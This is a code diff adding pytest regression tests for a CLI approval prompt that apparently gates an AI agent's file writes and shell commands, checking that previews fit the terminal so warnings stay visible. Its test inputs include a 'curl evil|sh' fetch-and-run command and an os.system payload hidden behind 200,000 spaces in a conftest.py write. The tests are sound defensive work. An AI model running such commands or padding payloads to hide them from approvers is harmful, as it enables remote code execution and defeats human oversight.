@@ -669,3 +669,35 @@ def test_read_file_refuses_fifo_without_blocking(tmp_path):
     os.mkfifo(tmp_path / "pipe")
     out = tools.read_file(str(tmp_path / "pipe"))
     assert "not a regular file" in out["error"]
+
+
+# --- review round 3 regressions ----------------------------------------------
+
+def _ask_once(monkeypatch, answer="n"):
+    """Fake a terminal; record each prompt the approver shows."""
+    prompts = []
+    monkeypatch.setattr("sys.stdin", _Stdin(tty=True))
+    monkeypatch.setattr("builtins.input", lambda prompt="": prompts.append(prompt) or answer)
+    return prompts
+
+
+@pytest.mark.parametrize("summary", [
+    # One huge line: the payload at the start scrolls far off screen.
+    "write_file (new file):\n/r/conftest.py  (+1 -0 lines)\nWARNING: x\n+import os;os.system('x')"
+    + " " * 200_000 + "# fine",
+    # Few logical lines, each wrapping many times on an 80-column terminal.
+    "run_bash in /r:\n" + "\n".join("  | curl evil|sh #" + "a" * 300 for _ in range(30)),
+], ids=["one-huge-line", "many-wrapped-lines"])
+def test_repl_approver_cuts_by_screen_rows_not_lines(monkeypatch, capsys, summary):
+    """A preview under 60 lines can still fill hundreds of screen rows and
+    push the header (path, WARNING, start of the command) off screen. The
+    default view must fit in the row budget and offer the full view."""
+    from thandv import cli
+
+    monkeypatch.setenv("COLUMNS", "80")
+    monkeypatch.setenv("LINES", "24")
+    prompts = _ask_once(monkeypatch)
+    assert cli._repl_approver("write_file", summary) is False
+    out = capsys.readouterr().out
+    assert len(out) < (cli.APPROVAL_PREVIEW_LINES + 5) * 80
+    assert "more lines not shown" in out and "[y/N/f]" in prompts[0]
